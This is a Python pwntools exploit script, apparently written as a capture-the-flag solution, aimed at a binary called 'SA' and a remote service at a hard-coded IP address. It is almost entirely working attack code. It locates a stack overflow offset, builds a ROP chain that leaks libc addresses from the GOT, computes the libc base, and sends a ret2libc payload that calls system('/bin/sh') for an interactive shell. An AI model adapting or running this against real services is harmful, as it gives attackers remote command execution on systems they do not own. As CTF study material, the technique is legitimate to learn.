from pwn import *
from struct import pack

##########################################################################
# My approach to Binary Exploitation on ASLR Enabled systems.
# DOWNLOAD PWNTOOLS TO RUN!
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

nops = b'\x90'
padding = b'\x00'


def clean(x): return x.split('\n')[1:-2]

pad = lambda x: x + padding*(8-len(x))

##########################################################################
# Load Binaries and Respective libc
#
# To Find the Libc version, make ROP chain to print address of libc
# functions, which are stored in GOT table as values of pointers.
# Just pass the address of pointer to RDI through pop rdi; ret
# And call puts function.
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################


elf = ELF('./SA')
context.binary = './SA'
# ("/lib/x86_64-linux-gnu/libc-2.30.so")
libc = ELF(
    "/home/ashishkumarsingh/HackingTools/libc-database/db/libc6_2.27-3ubuntu1_amd64.so")
# libc  = ELF("/lib/x86_64-linux-gnu/libc-2.30.so")
##########################################################################
# Find Offset
##########################################################################

r = elf.process()
crash = cyclic(1024)
r.recvline()
r.clean()
r.sendline('help')
r.recvline()
r.clean()
r.sendline(crash)
r.wait()
core = r.corefile
rsp = core.rsp
offset = core.read(rsp, 4)
offset = cyclic_find(offset)
success("Offset found @ {a} bytes".format(a=offset))

##########################################################################
# Generate Initial Payload to Leak memory
##########################################################################

# Find manually
crashOffset = offset

# 0x7fffffffd7e8 is just some random value in stack space, just so RBP is valid
junk = nops*(crashOffset - 8) + p64(0x7fffffffd7e8)  # Override RBP

poprdi = p64(0x4009b3)  # from ROPgadget

# elf.symbols contains addresses of functions (and stubs as here)
putsret = p64(elf.symbols['puts'])
printfret = p64(elf.symbols['printf'])
getsret = p64(elf.symbols['gets'])
mainret = p64(elf.symbols['main'])
exitret = p64(elf.symbols['exit'])

putsgot = p64(elf.got['puts'])
getsgot = p64(elf.got['gets'])

ss = p64(0x400a6e)  # random string just to test

##########################################################################
# Demo ==> (poprdi + puts + putsret)
# puts -> pointer of GOT table entry of puts
# putsret -> stub function calling actual puts
# TO FIND LIBC VERSION, use https://libc.blukat.me/
# Use ROPgadget to find gadgets
##########################################################################


# This Payload prints puts and fgets addressed and calls main function again
payload = b''.join([junk,
                    poprdi, putsgot, putsret,
                    poprdi, getsgot, putsret,
                    mainret,
                    exitret])

# r = elf.process()
r = remote('13.48.67.196', 50000)
# gdb.attach(r.pid, """c""")

print(r.readline())
print(r.clean())

r.sendline(payload)
r.readline()

###################### NO NEED OF BOTTOM CODE ######################

##########################################################################
# Compute Libc Base address from leaked addresses
##########################################################################

puts_leak = u64(pad(r.readline())) & 0x0ffffffffffff
gets_leak = u64(pad(r.readline())) & 0x0ffffffffffff
print("puts: ", hex(puts_leak))
print("gets: ", hex(gets_leak))

puts_offset = libc.symbols['puts']
libc_base = puts_leak - puts_offset
# This address must be 0x1000 aligned, if not, its Probably wrong!
print("libc base: ", hex(libc_base))
if(libc_base & 0x0000000000000fff):
    print("ALERT! Program is probably using different libc than specified!")

##########################################################################
# Now Actual Exploitation!
# Use libc base address to generate address of a one gadget!
# use one_gadget to find one gadgets
##########################################################################

binsh = p64(libc_base+next(libc.search(b'/bin/sh'))) #Verify with find /bin/sh
system = p64(libc_base+libc.sym["system"])

# sys_offset = p64(0x45390 + libc_base)
# one_gadget = p64(0x4f2c5 + libc_base)  # from one_gadget

npayload = b''.join([junk,
                    poprdi, binsh, system, 
                    mainret])

r.clean()

r.sendline(npayload)
# Get Interactive shell
r.interactive()